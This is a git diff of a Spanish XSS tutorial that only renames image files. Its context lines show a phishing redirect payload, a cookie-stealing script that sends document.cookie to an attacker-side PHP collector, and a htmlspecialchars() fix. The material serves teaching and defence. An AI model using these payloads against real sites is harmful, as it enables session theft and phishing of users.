@@ -53,7 +53,7 @@ el usuario envía el formulario, el comentario ingresado se muestra en la pantal
 
 El Código no sanitiza la entrada del usuario, lo que permite inyectar scripts maliciosos.
 
-![](images/xss1.png)
+![](images/imagen1.png)
 
 ### **Explotación de XSS**
 ---
@@ -69,7 +69,7 @@ Ingresar el siguiente código en el formulario:
 
 Si aparece un mensaje de alerta (alert()) en el navegador, significa que la aplicación es vulnerable.
 
-![](images/xss2.png)
+![](images/imagen2.png)
 
 **Explotación 2**
 
@@ -77,7 +77,7 @@ Podríamos redirigir a una página de phishing:
 
 `<script>window.location='https://fakeupdate.net/win11/'</script>`
 
-![](images/xss3.png)
+![](images/imagen3.png)
 
 
 **Capturar cookies del usuario (en ataques reales):**
@@ -107,11 +107,11 @@ Copia en el archivo coockieStealer/index.php [este archivo php](files/steal.php)
 <script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 ~~~
 
-![](images/xss4.png)
+![](images/imagen4.png)
 
 En el archivo **cookie.txt** del servidor del atacante se habrán guardado los datos de nuestra cookie:
 
-![](images/xss8.png)
+![](images/imagen8.png)
 
 Puedes investigar más en <https://github.com/TheWation/PhpCookieStealer/tree/master>
 
@@ -177,7 +177,7 @@ if (isset($_POST['comment'])) {
 </form>
 ~~~
 
-![](images/xss5.png)
+![](images/imagen5.png)
 
 Aunque usar htmlspecialchars() es una buena medida para prevenir ataques XSS, todavía se puede mejorar la
 seguridad y funcionalidad del código con los siguientes puntos:
